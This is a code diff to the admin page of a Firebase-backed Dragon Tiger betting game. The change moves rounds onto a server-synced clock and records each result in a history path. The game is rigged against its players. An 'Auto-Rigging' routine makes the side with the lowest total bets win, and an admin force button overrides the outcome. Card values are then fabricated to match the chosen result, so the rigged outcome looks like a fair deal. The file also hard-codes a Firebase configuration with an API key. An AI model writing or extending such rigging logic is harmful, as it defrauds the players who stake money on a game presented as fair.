@@ -7,7 +7,7 @@
         body { background: #0f172a; color: white; font-family: sans-serif; text-align: center; padding: 20px; }
         .stats { display: flex; justify-content: center; gap: 15px; margin: 20px 0; }
         .box { background: #1e293b; padding: 20px; border-radius: 10px; width: 140px; border-bottom: 4px solid #334155; }
-        .btn { padding: 15px 30px; border: none; border-radius: 8px; color: white; font-weight: bold; cursor: pointer; margin: 10px; }
+        .btn { padding: 15px 30px; border: none; border-radius: 8px; color: white; font-weight: bold; cursor: pointer; margin: 10px; list-style: none; text-decoration: none; }
         #timer { font-size: 40px; color: #fbbf24; }
     </style>
 </head>
@@ -32,57 +32,106 @@
 
 <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-    import { getDatabase, ref, onValue, update, set } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+    import { getDatabase, ref, onValue, update, set, get } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
 
     const firebaseConfig = { apiKey: "AIzaSyAzfvbiqRqsQwBOOIkegxJD09di-S_tfHg", authDomain: "test-eb5e7.firebaseapp.com", databaseURL: "https://test-eb5e7-default-rtdb.firebaseio.com", projectId: "test-eb5e7", appId: "1:366282855653:web:dca7e000f5a22fb11f300c" };
     const app = initializeApp(firebaseConfig);
     const db = getDatabase(app);
 
-    let timer = 60, state = "BETTING", forcedSide = null;
+    let state = "BETTING", forcedSide = null;
     let bD = 0, bT = 0, bTie = 0;
+    let localCurrentPeriod = 0, adminProcessed = false;
 
-    // Initialization: Pehli baar setup karne ke liye
-    set(ref(db, "dt_live"), { time: 60, state: "BETTING", totalDragon: 0, totalTiger: 0, totalTie: 0 });
+    // Connect to global distributed master sync clock
+    onValue(ref(db, ".info/serverTimeOffset"), offsetSnap => {
+        const offset = offsetSnap.val() || 0;
+        
+        setInterval(() => {
+            const serverTime = Date.now() + offset;
+            const totalSeconds = Math.floor(serverTime / 1000);
+            const secondInMinute = totalSeconds % 60;
+            const periodId = Math.floor(totalSeconds / 60);
 
-    setInterval(() => {
-        timer--;
-        if(timer <= 0) {
-            if(state === "BETTING") {
-                state = "RESULT"; timer = 8;
-                processMatch();
-            } else {
-                state = "BETTING"; timer = 60;
+            const timerEl = document.getElementById("timer");
+            const stateEl = document.getElementById("state-txt");
+
+            if (localCurrentPeriod !== periodId) {
+                localCurrentPeriod = periodId;
+                adminProcessed = false;
                 resetBets();
             }
-        }
-        update(ref(db, "dt_live"), { time: timer, state: state });
-        document.getElementById("timer").innerText = timer + "s";
-        document.getElementById("state-txt").innerText = state;
-    }, 1000);
 
-    function processMatch() {
+            if (secondInMinute < 45) {
+                // Live Sync Betting Phase
+                state = "BETTING";
+                let timeLeft = 45 - secondInMinute;
+                timerEl.innerText = timeLeft + "s";
+                stateEl.innerText = state + " (PERIOD: " + periodId + ")";
+                timerEl.style.color = "#fbbf24";
+            } else {
+                // Live Sync Reveal/Result Phase
+                state = "RESULT";
+                let timeLeft = 60 - secondInMinute;
+                timerEl.innerText = timeLeft + "s";
+                stateEl.innerText = state;
+                timerEl.style.color = "#ff4757";
+
+                if (!adminProcessed) {
+                    adminProcessed = true;
+                    processMatch(periodId);
+                }
+            }
+        }, 1000);
+    });
+
+    async function processMatch(periodId) {
         let winSide = "";
+        
+        // 1. Check if admin clicked Force Button
         if(forcedSide) {
             winSide = forcedSide;
         } else {
-            // Auto-Rigging: Jaha kam paisa hai usko jitao
+            // 2. Auto-Rigging Option: Calculate low bet side
             if(bD <= bT && bD <= bTie) winSide = 'dragon';
             else if(bT <= bD && bT <= bTie) winSide = 'tiger';
             else winSide = 'tie';
         }
 
+        // Card Index assignment logic
         let dc, tc;
-        if(winSide === 'dragon') { dc = 12; tc = 2; }
-        else if(winSide === 'tiger') { dc = 2; tc = 12; }
-        else { dc = 7; tc = 7; }
+        if(winSide === 'dragon') { dc = 12; tc = 2; } // K vs 3
+        else if(winSide === 'tiger') { dc = 2; tc = 12; }  // 3 vs K
+        else { dc = 7; tc = 7; }                           // 8 vs 8 (Tie)
 
-        update(ref(db, "dt_live"), { dCard: dc, tCard: tc, winner: winSide, state: "RESULT" });
+        // Force write to the shared dt_history path to seamlessly handle user win/losses
+        const historyRef = ref(db, `dt_history/${periodId}`);
+        await set(historyRef, {
+            period: periodId,
+            winner: winSide,
+            dCard: dc,
+            tCard: tc,
+            timestamp: Date.now()
+        });
+
+        // Sync old state structure to make sure users page catches results instantly
+        await update(ref(db, "dt_live"), { 
+            dCard: dc, 
+            tCard: tc, 
+            winner: winSide, 
+            state: "RESULT" 
+        });
+
+        // Clear force toggle for next turn
         forcedSide = null;
         document.getElementById("f-msg").innerText = "Current Mode: AUTO (Low Bet Wins)";
     }
 
     function resetBets() {
-        update(ref(db, "dt_live"), { totalDragon: 0, totalTiger: 0, totalTie: 0 });
+        bD = 0; bT = 0; bTie = 0;
+        document.getElementById("aD").innerText = "0";
+        document.getElementById("aT").innerText = "0";
+        document.getElementById("aTie").innerText = "0";
+        update(ref(db, "dt_live"), { totalDragon: 0, totalTiger: 0, totalTie: 0, state: "BETTING" });
     }
 
     window.force = (s) => {
@@ -90,6 +139,7 @@
         document.getElementById("f-msg").innerText = "FORCE WIN SET: " + s.toUpperCase();
     }
 
+    // Live monitor incoming active chips from all online users
     onValue(ref(db, "dt_live"), snap => {
         const d = snap.val();
         if(!d) return;
